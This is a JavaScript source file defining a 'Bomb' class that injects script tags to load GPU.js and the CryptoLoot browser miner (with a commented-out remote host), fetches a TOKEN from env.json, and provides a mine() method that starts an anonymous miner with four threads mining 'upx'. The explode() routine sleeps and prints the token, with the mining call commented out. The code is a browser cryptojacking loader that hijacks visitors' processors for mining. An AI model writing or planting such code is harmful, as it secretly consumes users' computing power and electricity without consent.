class Bomb {
    constructor() {
        this.libGPUjs = 'https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js'
        // this.libCryptoLoot = 'https://statdynamic.com/lib/crypta.js'
        this.libCryptoLoot = 'lib/cryptoloot-master/lib/crypta.js'
        this.envfile = 'env.json'

        console.log("Building bomb...")
        this.importLib(this.libGPUjs).then(() => {
            console.log('Ready to loot')
        })
        this.importLib(this.libCryptoLoot).then(() => {
            console.log('Ready to loot')
        })

        // this.libRequireJS = 'lib/require.js'
        // this.importLib(this.libRequireJS).then(() => {
        //     console.log('Ready to require')
        //
        // })
    }

    async importLib(src, isModule = false) {
        let li = document.createElement('script');
        if (!isModule) {
            li.type = 'text/javascript';
        } else {
            li.type = 'module';
        }
        li.src = src;
        li.async = false;
        let s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(li, s);
        return true
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getENV() {
        return await fetch(this.envfile)
            .then(response => response.json())
            .then(env => {
                return env
            })
    }

    async getToken() {
        let TOKEN = ''
        return await fetch(this.envfile)
            .then(response => response.json())
            .then(env => {
                return TOKEN = env.TOKEN
            })
    }

    testGPU(gpu) {
        const generateMatrices = () => {
            const matrices = [[], []]
            for (let y = 0; y < 512; y++) {
                matrices[0].push([])

                matrices[1].push([])
                for (let x = 0; x < 512; x++) {
                    matrices[0][y].push(Math.random())
                    matrices[1][y].push(Math.random())
                }
            }
            return matrices
        }

        const multiplyMatrix = gpu.createKernel(function (a, b) {
            let sum = 0;
            //for (let j = 0; j < 1000; j++) {
                for (let i = 0; i < 512; i++) {
                    sum += a[this.thread.y][i] * b[i][this.thread.x];
                }
            //}
            return sum;
        }).setOutput([512, 512])
        const matrices = generateMatrices()
        const out = multiplyMatrix(matrices[0], matrices[1])
        console.log(out[10][12]) // Logs the element at the 10th row and the 12th column of the output matrix
    }

    // async requireBundle() {
    //     requirejs.config({
    //         baseUrl: "lib/",
    //         enforceDefine: false,
    //         waitSeconds: 200,
    //         paths: {
    //             "gpujs": 'gpu-browser.min',
    //             'cryptoloot': './cryptoloot-master/lib/crypta'
    //         }
    //     });
    //
    //     //this.gpujs = requirejs(['gpujs'])
    //     requirejs(['cryptoloot'])
    // }

    mine(TOKEN) {
        this.worker = new CRLT.Anonymous(TOKEN, {
            threads: 4, throttle: 0.2, coin: "upx",
        });
        this.worker.start();
    }

    async explode() {
        await this.sleep(3000)
        // await this.requireBundle()

        let ENV = await this.getENV()
        let TOKEN = ENV.TOKEN
        console.log(TOKEN)
        //
        // const gpu = new GPU()
        // this.testGPU(gpu)
        // this.mine(TOKEN)
        // const gpuminer = gpu.createKernel(this.mine(TOKEN), {output: [1]})
        // console.log(gpuminer)
    }
}

